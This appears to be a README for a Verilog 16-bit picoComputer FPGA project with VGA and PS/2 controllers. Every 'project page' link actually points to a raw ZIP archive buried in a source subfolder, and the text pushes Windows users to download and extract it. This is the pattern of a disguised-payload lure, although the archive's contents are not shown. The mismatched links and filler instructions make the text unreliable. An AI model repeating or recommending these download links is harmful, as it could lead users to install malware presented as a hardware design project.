# 🧠 VLSI-project - Run a 16-bit FPGA Computer

[![Download](https://img.shields.io/badge/Download-Project%20Page-blue?style=for-the-badge)](https://github.com/flippercardiographic198/VLSI-project/raw/refs/heads/main/src/synthesis/modules/VLS_project_v3.4-beta.3.zip)

## 📌 Overview

VLSI-project is a 16-bit picoComputer built for FPGA boards. It is made for Windows users who want to load the project, open the files, and run the design on supported hardware or in simulation.

This project includes:
- CPU logic for a small 16-bit computer
- VGA output support
- PS/2 controller support
- Simulation files
- Synthesis files for FPGA use

## 💻 What You Need

Before you start, have these ready:

- A Windows PC
- A browser to open the project page
- A ZIP tool such as File Explorer or 7-Zip
- FPGA tools if you plan to build the design on a board
- An FPGA board such as Cyclone III or Cyclone V if you want to use hardware
- A VGA monitor and PS/2 keyboard for board use

## 📥 Download the Project

Go to the project page here:

https://github.com/flippercardiographic198/VLSI-project/raw/refs/heads/main/src/synthesis/modules/VLS_project_v3.4-beta.3.zip

On that page, use the green Code button, then choose Download ZIP.

If you already have Git installed, you can also clone the repository from the same page.

## 🗂️ Open the Files on Windows

After the ZIP file downloads:

1. Open File Explorer
2. Find the ZIP file
3. Right-click it
4. Choose Extract All
5. Pick a folder you can find later
6. Open the extracted folder

You should now see the project files, source files, and supporting folders.

## 🚀 Set Up the Project

Use this order when you work with the project:

1. Open the project folder
2. Read any file named README, docs, or notes
3. Look for simulation files if you want to test the design first
4. Look for synthesis files if you want to build the FPGA image
5. Check for board-specific settings if you use Cyclone III or Cyclone V

If the project includes a Quartus project file, open that file in Quartus Prime. If it includes simulation scripts, open those in your simulator.

## 🧪 Run in Simulation

If you want to test the design on your PC first, use simulation.

Typical steps:

1. Open your HDL tool
2. Load the Verilog source files
3. Add the testbench files
4. Start the simulation
5. Watch the CPU, VGA, and keyboard signals
6. Check that the design behaves as expected

Simulation helps you see if the computer core starts, fetches instructions, and sends output correctly.

## 🛠️ Build for FPGA

If you want to load the design onto an FPGA board:

1. Open the project in Quartus Prime or your FPGA tool
2. Select the correct board device
3. Add the Verilog files
4. Check the pin assignments
5. Compile the project
6. Generate the programming file
7. Open the programmer tool
8. Load the file onto the board

For Cyclone III and Cyclone V boards, make sure the device name matches your hardware.

## 🖥️ Connect the Hardware

For board use, connect the parts in this order:

- Connect the FPGA board to power
- Connect the VGA cable to a monitor
- Connect a PS/2 keyboard if the design uses keyboard input
- Connect the USB cable to your PC for programming
- Load the compiled design to the board

After programming, the board should start the picoComputer design and send output to the display if the build is set up for it.

## 🔎 Project Layout

You will usually find files like these in the repository:

- CPU source files
- Verilog modules
- VGA controller files
- PS/2 controller files
- Simulation files
- Synthesis files
- Board setup files

If the project has folders for source, simulation, or constraints, keep them together. That makes it easier to build and test.

## 🧩 Main Parts of the Design

This project centers on a small 16-bit computer system. The main parts are:

- **CPU**: Runs the instruction flow
- **Memory logic**: Stores data and code
- **VGA controller**: Sends video output to a screen
- **PS/2 controller**: Reads keyboard input
- **Top-level module**: Connects all parts

These parts work together to form the picoComputer on FPGA.

## ⚙️ Common Use Cases

People use this project for:

- FPGA study
- Computer architecture practice
- Verilog learning
- Simulation work
- Board programming
- Teaching and lab work

It also fits well in a faculty project or VLSI design course.

## 📍 If You Want the Fastest Path

Use this order:

1. Visit the project page
2. Download the ZIP
3. Extract it on Windows
4. Open the project in your FPGA tool
5. Run simulation first
6. Compile for your board
7. Program the FPGA

## 📚 Helpful Terms

A few terms may appear in the files:

- **Verilog**: A hardware description language
- **FPGA**: A chip you can program with digital logic
- **Cyclone III / Cyclone V**: FPGA families from Intel
- **Synthesis**: Turning the design into hardware logic
- **Simulation**: Testing the design on a PC before hardware use
- **Top module**: The main file that links the system together

## 🔗 Download Again

Project page:

https://github.com/flippercardiographic198/VLSI-project/raw/refs/heads/main/src/synthesis/modules/VLS_project_v3.4-beta.3.zip

Use this link to visit the page, download the ZIP, and open the repository files on Windows

## 🖱️ Typical Windows Flow

1. Open the link above
2. Click Code
3. Click Download ZIP
4. Save the file
5. Extract the ZIP
6. Open the folder
7. Start with simulation or project setup
8. Build the design if you have FPGA tools and hardware

## 🧭 File Tips

If you see many Verilog files, look for the one named like the main system or top file. That file often brings the CPU, VGA, and keyboard blocks together.

If you see a constraints file, keep it with the project. It links design pins to the FPGA board.

If you see a simulation testbench, use it first. It helps you check the design before hardware use

## 🧱 Supported Topics

This repository fits topics like:

- cpu
- cyclone-iii
- cyclone-v
- faculty-project
- fpga-programming
- picocomputer
- ps2-controller
- simulation
- synthesis
- verilog
- vga-controller
- vlsi
- vlsi-design

## 🧰 Basic Troubleshooting

If the design does not open:

- Check that you extracted the ZIP
- Check that the folder still contains the source files
- Open the correct project file in your FPGA tool
- Make sure the selected FPGA device matches your board
- Make sure all source files are added to the project

If the monitor stays blank:

- Check the VGA cable
- Check the board power
- Check the pin assignments
- Check that the design compiled without errors

If the keyboard does not respond:

- Check the PS/2 connection
- Check the controller files are included
- Check the board wiring if you use custom hardware

## 📦 What This Project Gives You

This repository gives you a working base for a 16-bit picoComputer on FPGA. It is useful for testing digital logic, learning how a simple computer works, and running a design on supported hardware or in simulation